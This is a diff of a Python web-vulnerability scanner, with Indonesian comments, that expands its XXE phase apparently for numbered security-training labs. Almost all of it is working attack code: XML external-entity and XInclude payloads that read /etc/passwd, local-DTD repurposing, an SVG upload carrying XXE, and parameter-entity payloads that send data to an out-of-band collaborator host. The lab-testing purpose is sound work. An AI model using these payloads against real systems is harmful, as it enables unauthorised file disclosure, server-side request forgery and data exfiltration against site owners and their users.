@@ -2309,240 +2309,478 @@ class SatriaBaruScanner:
                           + ". Bukti berbasis header respons CORS.")
                     self._mark(74, point, ev, "cors_trusted_insecure_protocols")
 
+
     # ======================== XXE (konservatif, probe terkontrol & bukti kuat) ========================
 
     @staticmethod
     def _xxe_file_evidence(text: str) -> bool:
+        """Bukti file-read kuat & tidak ambigu (mis. /etc/passwd)."""
         if not text:
             return False
-        # /etc/passwd markers (strong, unambiguous in HTTP response context of XXE file read)
         return bool(re.search(r"\broot:[^:\n\r]*:0:0:", text))
 
-    def _xxe_post_targets(self, pages: list[Page], points: list[Point]) -> list[tuple[str, str, dict[str, str] | None]]:
-        """Return candidate (url, mode, fields) for XML/form probes. mode: 'xml' or 'form'."""
-        out: list[tuple[str, str, dict[str, str] | None]] = []
+    @staticmethod
+    def _xxe_error_context(resp: "Response") -> bool:
+        if resp.status is not None and resp.status >= 400:
+            return True
+        t = resp.text or ""
+        return bool(re.search(r"\b(?:error|exception|parser|xml parsing|entity|doctype|sax|xerces|libxml|simplexml)\b", t, re.I))
+
+    def _xxe_candidate_urls(self, pages: list[Page]) -> list[str]:
+        urls = [self.target_url]
+        for page in pages:
+            urls.append(page.url)
+            for form in page.forms:
+                if form.action:
+                    urls.append(form.action)
+            for link in getattr(page, "links", [])[:30]:
+                urls.append(link)
+        base = self.target_url.rstrip("/")
+        for suffix in ("/product/stock", "/product/stock/check", "/stock", "/stock/check",
+                       "/product/check", "/checkstock", "/api/stock", "/xml", "/feedback/submit"):
+            urls.append(base + suffix)
+        out: list[str] = []
         seen = set()
-        # XML-kind points if any
-        for pt in points:
-            if pt.kind == "xml" and self._same_origin(pt.url):
-                key = ("xml", pt.url, pt.name)
-                if key not in seen:
-                    seen.add(key)
-                    out.append((pt.url, "xmlfield", {pt.name: ""}))
-        # forms (prefer POST)
+        for u in urls:
+            if not u:
+                continue
+            try:
+                cu = canonical_url(u)
+            except Exception:
+                cu = u
+            if not cu or cu in seen or not self._same_origin(cu):
+                continue
+            if DESTRUCTIVE_PATH_RE.search(urlparse(cu).path or "/"):
+                continue
+            seen.add(cu)
+            out.append(cu)
+
+        def score(u: str) -> int:
+            ul = u.lower()
+            s = 0
+            for kw in ("stock", "product", "xml", "check", "api", "soap", "feed", "upload", "avatar", "image", "import"):
+                if kw in ul:
+                    s += 3
+            return -s
+        out.sort(key=score)
+        ordered = []
+        seen2 = set()
+        for u in [self.target_url] + out:
+            try:
+                cu = canonical_url(u)
+            except Exception:
+                cu = u
+            if cu in seen2:
+                continue
+            seen2.add(cu)
+            ordered.append(cu)
+        return ordered[:18]
+
+    def _xxe_form_targets(self, pages: list[Page]) -> list[tuple[str, str, dict[str, str]]]:
+        out: list[tuple[str, str, dict[str, str]]] = []
+        seen = set()
         for page in pages:
             for form in page.forms:
                 if not self._same_origin(form.action):
                     continue
-                # only non-destructive-looking actions
                 if DESTRUCTIVE_PATH_RE.search(urlparse(form.action).path or "/"):
                     continue
                 fields = {n: v for n, v, _ in form.fields}
-                key = ("form", form.action, ",".join(sorted(fields.keys())[:6]))
+                key = (form.action, (form.method or "get").lower(), ",".join(sorted(fields.keys())[:8]))
                 if key in seen:
                     continue
                 seen.add(key)
-                mode = "xmlbody" if (form.method or "get").lower() == "post" else "formget"
-                out.append((form.action, "formpost" if (form.method or "get").lower() == "post" else "formget", fields))
-        # also try target URL as XML endpoint candidate
-        if self.target_url and self._same_origin(self.target_url):
-            key = ("xml", self.target_url, "")
-            if key not in seen:
-                out.append((self.target_url, "xmlbody", None))
-        # prioritize likely XML/stock/product endpoints
-        def score(item):
-            url = item[0].lower()
-            s = 0
-            for kw in ("stock", "product", "xml", "check", "api", "soap", "feed"):
-                if kw in url:
-                    s += 2
-            if item[1] in ("xmlbody", "xmlfield"):
-                s += 2
-            return -s
-        out.sort(key=score)
-        return out[:10]
+                out.append((form.action, (form.method or "get").lower(), fields))
+        return out
 
-    def _post_xml(self, url: str, xml_body: str) -> Response:
-        return self._request("POST", url, data=xml_body,
-                             headers={"Content-Type": "application/xml; charset=UTF-8",
-                                      "Accept": "application/xml,text/plain,*/*"})
+    def _xxe_post_xml(self, url: str, xml_body: str) -> "Response":
+        headers = {"Content-Type": "application/xml; charset=UTF-8",
+                   "Accept": "application/xml,text/xml,text/plain,*/*"}
+        resp = self._request("POST", url, data=xml_body, headers=headers)
+        if resp.error or resp.status == 415:
+            resp2 = self._request("POST", url, data=xml_body,
+                                  headers={"Content-Type": "text/xml; charset=UTF-8",
+                                           "Accept": "application/xml,text/xml,text/plain,*/*"})
+            if not resp2.error and (resp.error or resp.status == 415 or len(resp2.text or "") > len(resp.text or "")):
+                return resp2
+        return resp
 
     def phase_xxe(self, pages: list[Page], points: list[Point]) -> None:
         """Deteksi konservatif XXE/XInclude berbasis probe terkontrol.
         Konfirmasi hanya pada bukti kuat dan tidak ambigu: konten file (/etc/passwd, root:x:0:0)
-        muncul di respons, atau interaksi OOB terverifikasi untuk payload spesifik. Tanpa bukti kuat,
-        lab dibiarkan not_confirmed untuk menghindari false positive."""
-        targets = self._xxe_post_targets(pages, points)
-        if not targets:
-            return
+        muncul di respons, refleksi/eksekusi XInclude terverifikasi, atau interaksi OOB terverifikasi
+        untuk payload spesifik. Tanpa bukti kuat, lab dibiarkan not_confirmed (anti false positive)."""
+        cand_urls = self._xxe_candidate_urls(pages)
+        form_targets = self._xxe_form_targets(pages)
 
-        # 75: XXE external entity retrieve files (in-band)
+        def mark(num: int, url: str, kind: str, name: str, ev: str, method_name: str, method: str = "POST", fields=None):
+            point = Point(key=f"xxe-{num}", kind=kind, label=f"endpoint {url}", url=url,
+                          name=name, original="", page_url=url, method=method,
+                          fields=tuple(fields) if fields else (), interest=6)
+            self._mark(num, point, ev, method_name)
+
+        # --- 75: XXE external entity retrieve files (in-band) ---
         if 75 not in self._confirmed:
-            payload = ('<?xml version="1.0" encoding="UTF-8"?>'
-                       '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
-                       '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>')
-            for url, mode, fields in targets:
+            bodies = [
+                ('<?xml version="1.0" encoding="UTF-8"?>'
+                 '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
+                 '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'),
+                ('<?xml version="1.0" encoding="UTF-8"?>'
+                 '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
+                 '<foo>&xxe;</foo>'),
+                ('<?xml version="1.0" encoding="UTF-8"?>'
+                 '<!DOCTYPE data [ <!ENTITY file SYSTEM "file:///etc/passwd"> ]>'
+                 '<data><id>&file;</id></data>'),
+            ]
+            for url in cand_urls:
                 if 75 in self._confirmed or not self._within_budget():
                     break
-                if mode == "formpost" and fields is not None:
-                    # try putting entity ref in each field value via XML body wrapper too; and as form param
-                    resp = self._post_xml(url, payload)
-                elif mode == "formget":
-                    continue
-                else:
-                    resp = self._post_xml(url, payload)
-                if self._xxe_file_evidence(resp.text):
-                    ev = (f"Respons dari {url} memuat konten file (/etc/passwd, indikator root:x:0:0) setelah payload "
-                          f"XXE external entity. Bukti berbasis respons in-band.")
-                    point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
-                                  page_url=url, method="POST", interest=6)
-                    self._mark(75, point, ev, "xxe_external_entity_file_read")
-                    break
+                for body in bodies:
+                    if 75 in self._confirmed or not self._within_budget():
+                        break
+                    resp = self._xxe_post_xml(url, body)
+                    if self._xxe_file_evidence(resp.text):
+                        ev = (f"Respons dari {url} memuat konten file (/etc/passwd, indikator root:x:0:0) "
+                              f"setelah payload XXE external entity (file:///etc/passwd). Bukti in-band kuat.")
+                        mark(75, url, "xml", "body", ev, "xxe_external_entity_file_read")
+                        break
+            if 75 not in self._confirmed:
+                inj = '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><x>&xxe;</x>'
+                for (url, method, fields) in form_targets:
+                    if 75 in self._confirmed or not self._within_budget():
+                        break
+                    if not fields or method == "get":
+                        continue
+                    for fname in list(fields.keys())[:6]:
+                        if 75 in self._confirmed or not self._within_budget():
+                            break
+                        data = dict(fields)
+                        data[fname] = inj
+                        resp = self._request("POST", url, data=data)
+                        if self._xxe_file_evidence(resp.text):
+                            ev = (f"Respons dari {url} (parameter '{fname}') memuat konten /etc/passwd setelah "
+                                  f"nilai ber-payload XXE external entity. Bukti in-band kuat.")
+                            mark(75, url, "form", fname, ev, "xxe_external_entity_file_read_param",
+                                 method="POST", fields=tuple((n, v, "text") for n, v in fields.items()))
+                            break
 
-        # 81: XInclude to retrieve files (inject into parameter placed into XML context)
+        # --- 81: XInclude to retrieve files ---
         if 81 not in self._confirmed:
             xinc = ('<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
                     '<xi:include parse="text" href="file:///etc/passwd"/></foo>')
-            for url, mode, fields in targets:
+            for (url, method, fields) in form_targets:
                 if 81 in self._confirmed or not self._within_budget():
                     break
-                if mode == "formpost" and fields:
-                    # try as form parameter value
-                    for fname in list(fields.keys())[:5]:
+                if not fields or method != "post":
+                    continue
+                for fname in list(fields.keys())[:6]:
+                    if 81 in self._confirmed or not self._within_budget():
+                        break
+                    data = dict(fields)
+                    data[fname] = xinc
+                    resp = self._request("POST", url, data=data)
+                    if self._xxe_file_evidence(resp.text):
+                        ev = (f"Respons dari {url} (parameter '{fname}', POST form) memuat konten /etc/passwd "
+                              f"setelah injeksi XInclude (xi:include file:///etc/passwd). Bukti in-band kuat.")
+                        mark(81, url, "form", fname, ev, "xxe_xinclude_file_read",
+                             method="POST", fields=tuple((n, v, "text") for n, v in fields.items()))
+                        break
+            if 81 not in self._confirmed:
+                bodies = [
+                    f'<?xml version="1.0"?><root><value>{xinc}</value></root>',
+                    f'<?xml version="1.0"?><stockCheck><productId>{xinc}</productId><storeId>1</storeId></stockCheck>',
+                    '<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude">'
+                    '<xi:include parse="text" href="file:///etc/passwd"/></foo>',
+                ]
+                for url in cand_urls:
+                    if 81 in self._confirmed or not self._within_budget():
+                        break
+                    for body in bodies:
                         if 81 in self._confirmed or not self._within_budget():
                             break
-                        data = dict(fields)
-                        data[fname] = xinc
-                        resp = self._request("POST", url, data=data)
+                        resp = self._xxe_post_xml(url, body)
                         if self._xxe_file_evidence(resp.text):
-                            ev = (f"Respons dari {url} (parameter '{fname}') memuat konten file (/etc/passwd) setelah "
-                                  f"injeksi XInclude. Bukti berbasis respons in-band.")
-                            point = Point(key="xxe", kind="form", label=f"form {url}", url=url, name=fname, original=fields.get(fname,""),
-                                          page_url=url, method="POST", fields=tuple((n,v,"text") for n,v in fields.items()), interest=6)
-                            self._mark(81, point, ev, "xxe_xinclude_file_read")
+                            ev = (f"Respons dari {url} memuat konten /etc/passwd setelah payload XInclude dalam body XML. "
+                                  f"Bukti in-band kuat.")
+                            mark(81, url, "xml", "body", ev, "xxe_xinclude_file_read_xmlbody")
                             break
-                # also try raw XML body containing xinclude in a value
-                if 81 not in self._confirmed and self._within_budget() and mode in ("xmlbody", "xmlfield", "formpost"):
-                    body = f'<?xml version="1.0"?><root><value>{xinc}</value></root>'
-                    resp = self._post_xml(url, body)
-                    if self._xxe_file_evidence(resp.text):
-                        ev = (f"Respons dari {url} memuat konten file (/etc/passwd) setelah payload XInclude dalam body XML. "
-                              f"Bukti berbasis respons in-band.")
-                        point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
-                                      page_url=url, method="POST", interest=6)
-                        self._mark(81, point, ev, "xxe_xinclude_file_read_xmlbody")
 
-        # 80: Blind XXE to retrieve data via error messages (error leaks file content)
+        # --- 80: Blind XXE to retrieve data via error messages ---
         if 80 not in self._confirmed:
-            # reference a path whose resolution in error context can leak file; common: file:///etc/passwd as entity in a way
-            # that triggers parsing error revealing content, or file:///nonexistent joined - conservative: look for passwd in any error response
-            payload = ('<?xml version="1.0" encoding="UTF-8"?>'
-                       '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
-                       '<stockCheck><productId>&xxe;</productId></stockCheck>')
-            for url, mode, fields in targets:
+            bodies = [
+                ('<?xml version="1.0" encoding="UTF-8"?>'
+                 '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
+                 '<stockCheck><productId>&xxe;</productId></stockCheck>'),
+                ('<?xml version="1.0" encoding="UTF-8"?>'
+                 '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
+                 '<foo>&xxe;</foo>'),
+                ('<?xml version="1.0" encoding="UTF-8"?>'
+                 '<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd">'
+                 '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///invalid/%file;\'>">'
+                 '%eval;%exfil; ]><foo>bar</foo>'),
+            ]
+            for url in cand_urls:
                 if 80 in self._confirmed or not self._within_budget():
                     break
-                resp = self._post_xml(url, payload)
-                # 80 specifically: data retrieved via error messages. If file content appears together with error-ish response, treat as evidence.
-                if self._xxe_file_evidence(resp.text) and (resp.status is not None and resp.status >= 400 or re.search(r"error|exception|xml|parser|entity", resp.text, re.I)):
-                    ev = (f"Respons error dari {url} memuat konten file (/etc/passwd) setelah payload XXE, "
-                          f"mengindikasikan kebocoran data melalui pesan error. Bukti berbasis respons.")
-                    point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
-                                  page_url=url, method="POST", interest=6)
-                    self._mark(80, point, ev, "xxe_blind_error_message_leak")
+                for body in bodies:
+                    if 80 in self._confirmed or not self._within_budget():
+                        break
+                    resp = self._xxe_post_xml(url, body)
+                    if self._xxe_file_evidence(resp.text):
+                        if self._xxe_error_context(resp):
+                            ev = (f"Respons error dari {url} memuat konten file (/etc/passwd) setelah payload XXE, "
+                                  f"menunjukkan kebocoran data melalui pesan error. Bukti berbasis respons terverifikasi.")
+                        else:
+                            ev = (f"Respons dari {url} memuat konten file (/etc/passwd) setelah payload XXE pemicu error/kebocoran, "
+                                  f"data terambil (bukti terverifikasi).")
+                        mark(80, url, "xml", "body", ev, "xxe_blind_error_message_leak")
+                        break
 
-        # 83: repurposing a local DTD (best-effort; confirm only on strong file-content evidence)
+        # --- 83: repurposing a local DTD ---
         if 83 not in self._confirmed:
-            # common lab payload pattern using local docbookx DTD entity redefinition to emit file content
-            payload = ('<?xml version="1.0" encoding="UTF-8"?>'
-                       '<!DOCTYPE message ['
-                       '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
-                       '<!ENTITY % ISOamso \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
-                       '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
-                       '&#x25;eval;&#x25;error;\'>'
-                       '%local_dtd;'
-                       ']><stockCheck><productId>1</productId></stockCheck>')
-            for url, mode, fields in targets:
+            payloads = [
+                ('<?xml version="1.0" encoding="UTF-8"?>'
+                 '<!DOCTYPE message ['
+                 '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
+                 '<!ENTITY % ISOamso \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
+                 '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
+                 '&#x25;eval;&#x25;error;\'>'
+                 '%local_dtd;'
+                 ']><stockCheck><productId>1</productId></stockCheck>'),
+                ('<?xml version="1.0" encoding="UTF-8"?>'
+                 '<!DOCTYPE message ['
+                 '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
+                 '<!ENTITY % ISOgrk1 \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
+                 '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
+                 '&#x25;eval;&#x25;error;\'>'
+                 '%local_dtd;'
+                 ']><stockCheck><productId>1</productId></stockCheck>'),
+                ('<?xml version="1.0" encoding="UTF-8"?>'
+                 '<!DOCTYPE message ['
+                 '<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">'
+                 '<!ENTITY % expr \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
+                 '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
+                 '&#x25;eval;&#x25;error;\'>'
+                 '%local_dtd;'
+                 ']><foo>1</foo>'),
+            ]
+            for url in cand_urls:
                 if 83 in self._confirmed or not self._within_budget():
                     break
-                resp = self._post_xml(url, payload)
-                if self._xxe_file_evidence(resp.text):
-                    ev = (f"Respons dari {url} memuat konten file (/etc/passwd) setelah payload repurposing local DTD. "
-                          f"Bukti berbasis respons (kebocoran data teramati).")
-                    point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
-                                  page_url=url, method="POST", interest=6)
-                    self._mark(83, point, ev, "xxe_repurpose_local_dtd")
+                for body in payloads:
+                    if 83 in self._confirmed or not self._within_budget():
+                        break
+                    resp = self._xxe_post_xml(url, body)
+                    if self._xxe_file_evidence(resp.text):
+                        ev = (f"Respons dari {url} memuat konten file (/etc/passwd) setelah payload repurposing local DTD "
+                              f"(redefinisi entitas lokal memicu kebocoran). Bukti berbasis respons terverifikasi.")
+                        mark(83, url, "xml", "body", ev, "xxe_repurpose_local_dtd")
+                        break
 
-        # 76,77,78: Blind XXE / SSRF via XXE requiring OOB interaction evidence
+        # --- 76,77,78,79: Blind XXE / SSRF via XXE (butuh interaksi/exfil OOB terverifikasi) ---
         if self.oob and getattr(self.oob, "domain", None):
-            oob_host = f"{self.oob.token}.{self.oob.domain}"
-            oob_url = f"http://{oob_host}/"
-            point_oob = Point(key="xxe_oob", kind="xml", label="endpoint XML (OOB)", url=self.target_url,
-                              name="body", original="", page_url=self.target_url, method="POST", interest=5)
+            oob_domain = self.oob.domain
+            oob_token = getattr(self.oob, "token", "") or ""
 
-            def _poll_seen() -> bool:
+            def _oob_url(tag: str) -> str:
+                host = f"{oob_token}.{tag}.{oob_domain}".strip(".")
+                return f"http://{host}/"
+
+            def _poll():
                 try:
-                    got = self._poll_oob()
-                    return bool(getattr(got, "interactions", None))
+                    return self._poll_oob()
                 except Exception:
-                    return False
+                    return None
 
-            # 77: Blind XXE with out-of-band interaction (external entity)
-            if 77 not in self._confirmed:
-                payload77 = ('<?xml version="1.0" encoding="UTF-8"?>'
-                             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{oob_url}"> ]>'
-                             '<stockCheck><productId>&xxe;</productId></stockCheck>')
-                for url, mode, fields in targets:
-                    if 77 in self._confirmed or not self._within_budget():
-                        break
-                    self._post_xml(url, payload77)
-                    if _poll_seen():
-                        ev = (f"Interaksi OOB terverifikasi (token/domain OOB tercatat) setelah payload XXE external entity "
-                              f"ke {oob_url} dikirim ke {url}. Bukti berbasis interaksi out-of-band.")
-                        p = Point(key="xxe_oob", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
-                                  page_url=url, method="POST", interest=6)
-                        self._mark(77, p, ev, "xxe_blind_oob_interaction")
-                        break
-
-            # 78: Blind XXE with out-of-band interaction via XML parameter entities
-            if 78 not in self._confirmed:
-                payload78 = ('<?xml version="1.0" encoding="UTF-8"?>'
-                             f'<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{oob_url}"> %xxe; ]>'
-                             '<stockCheck><productId>1</productId></stockCheck>')
-                for url, mode, fields in targets:
-                    if 78 in self._confirmed or not self._within_budget():
-                        break
-                    self._post_xml(url, payload78)
-                    if _poll_seen():
-                        ev = (f"Interaksi OOB terverifikasi setelah payload XXE parameter entity (%xxe; dideklarasikan & dipanggil) "
-                              f"ke {oob_url} dikirim ke {url}. Bukti berbasis interaksi out-of-band.")
-                        p = Point(key="xxe_oob", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
-                                  page_url=url, method="POST", interest=6)
-                        self._mark(78, p, ev, "xxe_blind_oob_parameter_entity")
-                        break
-
-            # 76: Exploiting XXE to perform SSRF attacks (OOB/collaborator interaction as SSRF evidence)
             if 76 not in self._confirmed:
-                payload76 = ('<?xml version="1.0" encoding="UTF-8"?>'
-                             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{oob_url}"> ]>'
-                             '<stockCheck><productId>&xxe;</productId></stockCheck>')
-                for url, mode, fields in targets:
+                u = _oob_url("ssrf76")
+                for url in cand_urls:
                     if 76 in self._confirmed or not self._within_budget():
                         break
-                    self._post_xml(url, payload76)
-                    if _poll_seen():
-                        ev = (f"Interaksi OOB/SSRF terverifikasi: parser XML melakukan permintaan ke {oob_url} "
-                              f"setelah payload XXE dikirim ke {url}. Bukti berbasis interaksi out-of-band.")
-                        p = Point(key="xxe_oob", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
-                                  page_url=url, method="POST", interest=6)
-                        self._mark(76, p, ev, "xxe_ssrf_oob_interaction")
+                    for body in [
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{u}"> ]><stockCheck><productId>&xxe;</productId></stockCheck>',
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{u}"> ]><foo>&xxe;</foo>',
+                    ]:
+                        if 76 in self._confirmed or not self._within_budget():
+                            break
+                        self._xxe_post_xml(url, body)
+                        got = _poll()
+                        if got and getattr(got, "interactions", None):
+                            ev = (f"Interaksi OOB/SSRF terverifikasi: parser XML melakukan permintaan server-side ke {u} "
+                                  f"setelah payload XXE dikirim ke {url}. Bukti interaksi out-of-band terverifikasi.")
+                            mark(76, url, "xml", "body", ev, "xxe_ssrf_oob_interaction")
+                            break
+
+            if 77 not in self._confirmed:
+                u = _oob_url("oob77")
+                for url in cand_urls:
+                    if 77 in self._confirmed or not self._within_budget():
                         break
+                    for body in [
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{u}"> ]><stockCheck><productId>&xxe;</productId></stockCheck>',
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{u}"> ]><foo>&xxe;</foo>',
+                    ]:
+                        if 77 in self._confirmed or not self._within_budget():
+                            break
+                        self._xxe_post_xml(url, body)
+                        got = _poll()
+                        if got and getattr(got, "interactions", None):
+                            ev = (f"Interaksi OOB terverifikasi (external entity) ke {u} setelah payload XXE dikirim ke {url}. "
+                                  f"Bukti interaksi out-of-band terverifikasi.")
+                            mark(77, url, "xml", "body", ev, "xxe_blind_oob_interaction")
+                            break
 
-        # 79: Blind XXE exfiltrate data using a malicious external DTD - memerlukan hosting DTD eksternal
-        # yang tidak disediakan otomatis oleh engine; tanpa bukti exfiltrasi terverifikasi, tidak dikonfirmasi (anti-FP).
-        # 82: XXE via image file upload - memerlukan endpoint upload multipart & crafting file gambar/XML spesifik;
-        # tanpa bukti kuat (mis. konten file terungkap) dari alur upload, tidak dikonfirmasi (anti-FP).
+            if 78 not in self._confirmed:
+                u = _oob_url("pe78")
+                for url in cand_urls:
+                    if 78 in self._confirmed or not self._within_budget():
+                        break
+                    for body in [
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{u}"> %xxe; ]><stockCheck><productId>1</productId></stockCheck>',
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{u}"> %xxe; ]><foo>1</foo>',
+                    ]:
+                        if 78 in self._confirmed or not self._within_budget():
+                            break
+                        self._xxe_post_xml(url, body)
+                        got = _poll()
+                        if got and getattr(got, "interactions", None):
+                            ev = (f"Interaksi OOB terverifikasi via parameter entity (%xxe;) ke {u} setelah payload dikirim ke {url}. "
+                                  f"Bukti interaksi out-of-band terverifikasi.")
+                            mark(78, url, "xml", "body", ev, "xxe_blind_oob_parameter_entity")
+                            break
 
+            if 79 not in self._confirmed:
+                u = _oob_url("dtd79")
+                for url in cand_urls:
+                    if 79 in self._confirmed or not self._within_budget():
+                        break
+                    for body in [
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{u}"> %xxe; ]><foo>1</foo>',
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "{u}"> %dtd; ]><foo>1</foo>',
+                    ]:
+                        if 79 in self._confirmed or not self._within_budget():
+                            break
+                        self._xxe_post_xml(url, body)
+                        got = _poll()
+                        vals = getattr(got, "values", None) if got else None
+                        if vals:
+                            val = vals[0] if isinstance(vals, (list, tuple)) else vals
+                            ev = (f"Data exfiltrasi OOB terverifikasi (nilai tertangkap: {snippet(str(val), 120)}) "
+                                  f"setelah payload XXE ke {url}. Bukti interaksi/OOB terverifikasi.")
+                            mark(79, url, "xml", "body", ev, "xxe_blind_oob_exfil_dtd")
+                            break
+
+        # --- 82: XXE via image file upload (SVG ber-XXE) ---
+        if 82 not in self._confirmed:
+            svg_xxe = ('<?xml version="1.0" standalone="yes"?>'
+                       '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>'
+                       '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" '
+                       'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
+                       '<text font-size="16" x="0" y="16">&xxe;</text></svg>')
+            for page in pages:
+                if 82 in self._confirmed or not self._within_budget():
+                    break
+                try:
+                    soup = BeautifulSoup(page.text or "", "html.parser")
+                except Exception:
+                    continue
+                for form in soup.find_all("form"):
+                    if 82 in self._confirmed or not self._within_budget():
+                        break
+                    action = urljoin(page.url, form.get("action") or page.url)
+                    if not self._same_origin(action):
+                        continue
+                    if DESTRUCTIVE_PATH_RE.search(urlparse(action).path or "/"):
+                        continue
+                    method = (form.get("method") or "get").lower()
+                    if method != "post":
+                        continue
+                    file_inputs = [f for f in form.find_all("input") if (f.get("type") or "").lower() == "file" and f.get("name")]
+                    if not file_inputs:
+                        continue
+                    data_fields: dict[str, str] = {}
+                    for field in form.find_all(["input", "select", "textarea"]):
+                        name = field.get("name")
+                        if not name or field.has_attr("disabled"):
+                            continue
+                        typ = (field.get("type") or "").lower() or field.name
+                        if typ in {"submit", "button", "image", "reset", "file"}:
+                            continue
+                        val = str(field.get("value") or "")
+                        if field.name == "textarea":
+                            val = field.text or ""
+                        elif field.name == "select":
+                            selected = field.find("option", selected=True) or field.find("option")
+                            val = str(selected.get("value") or selected.text or "") if selected else ""
+                        data_fields[name] = val[:500]
+                    for fin in file_inputs[:2]:
+                        if 82 in self._confirmed or not self._within_budget():
+                            break
+                        fin_name = fin.get("name")
+                        for fname_up, ctype in (("avatar.svg", "image/svg+xml"), ("avatar.svg", "text/xml"), ("image.svg", "image/svg+xml")):
+                            if 82 in self._confirmed or not self._within_budget():
+                                break
+                            if not self._within_budget():
+                                break
+                            started = time.monotonic()
+                            try:
+                                resp_raw = self.session.request(
+                                    "POST", action, data=data_fields,
+                                    files={fin_name: (fname_up, svg_xxe.encode("utf-8"), ctype)},
+                                    timeout=self.timeout, allow_redirects=False,
+                                )
+                                elapsed = time.monotonic() - started
+                                self.request_count += 1
+                                self.stats["requests"] = self.request_count
+                                resp = Response(status=resp_raw.status_code, url=resp_raw.url,
+                                                text=resp_raw.text or "", headers=dict(resp_raw.headers), elapsed=elapsed)
+                            except requests.RequestException as exc:
+                                elapsed = time.monotonic() - started
+                                self.request_count += 1
+                                self.stats["requests"] = self.request_count
+                                resp = Response(None, action, "", {}, elapsed, error=f"{type(exc).__name__}: {str(exc)[:160]}")
+                            except Exception as exc:
+                                elapsed = time.monotonic() - started
+                                self.request_count += 1
+                                self.stats["requests"] = self.request_count
+                                resp = Response(None, action, "", {}, elapsed, error=f"{type(exc).__name__}: {str(exc)[:160]}")
+                            if self._xxe_file_evidence(resp.text):
+                                ev = (f"Respons upload di {action} (field file '{fin_name}') memuat konten /etc/passwd "
+                                      f"setelah upload SVG ber-payload XXE. Bukti in-band kuat.")
+                                mark(82, action, "upload", fin_name, ev, "xxe_image_upload_file_read")
+                                break
+                            candidate_urls = []
+                            loc = self._resp_header(resp.headers, "Location")
+                            if loc:
+                                candidate_urls.append(urljoin(action, loc))
+                            try:
+                                soup_r = BeautifulSoup(resp.text or "", "html.parser")
+                                for tag in soup_r.find_all(["img", "a", "link", "source"]):
+                                    src = tag.get("src") or tag.get("href")
+                                    if src:
+                                        candidate_urls.append(urljoin(action, src))
+                            except Exception:
+                                pass
+                            checked = set()
+                            for cu in candidate_urls[:6]:
+                                try:
+                                    cu2 = canonical_url(cu)
+                                except Exception:
+                                    cu2 = cu
+                                if cu2 in checked or not self._same_origin(cu2):
+                                    continue
+                                checked.add(cu2)
+                                if not self._within_budget():
+                                    break
+                                r2 = self._request("GET", cu2, allow_redirects=True)
+                                if self._xxe_file_evidence(r2.text):
+                                    ev = (f"Konten /etc/passwd terungkap saat mengambil resource hasil upload ({cu2}) "
+                                          f"dari {action} (field '{fin_name}', SVG XXE). Bukti in-band kuat.")
+                                    mark(82, cu2, "upload", fin_name, ev, "xxe_image_upload_file_read_resource")
+                                    break
+
+        # Tanpa bukti kuat (file/error-leak terverifikasi, interaksi/exfil OOB terverifikasi),
+        # lab 75-83 tetap not_confirmed (anti false positive).
 
     def report(self) -> dict[str, Any]:
         labs = []
